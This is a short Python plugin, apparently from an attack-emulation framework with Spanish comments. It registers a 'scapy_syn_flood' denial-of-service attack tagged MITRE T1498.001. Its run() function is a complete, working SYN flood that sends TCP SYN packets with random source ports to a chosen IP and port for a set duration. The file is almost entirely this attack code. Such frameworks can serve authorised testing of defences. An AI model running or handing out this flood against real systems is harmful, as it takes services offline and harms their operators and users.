from modules.attacks.base import AttackDef

ATTACK_DEFS = [
    AttackDef(
        name="scapy_syn_flood",
        description="SYN flood con Scapy",
        mitre_ref="T1498.001",
        tool="python/scapy",
        category="dos",
        command="",              # sin comando de sistema
        local_fallback="plugins.attacks.scapy_syn_flood:run",
        requires_root=True,
        recommended_dur_s=30,
    )
]

def run(target_ip: str, port: int = 80, duration: int = 30, **kwargs):
    from scapy.all import IP, TCP, send, RandShort
    import time
    end = time.time() + duration
    sent = 0
    while time.time() < end:
        pkt = IP(dst=target_ip) / TCP(sport=RandShort(), dport=port, flags="S")
        send(pkt, verbose=False)
        sent += 1
    return {"success": True, "packets": sent}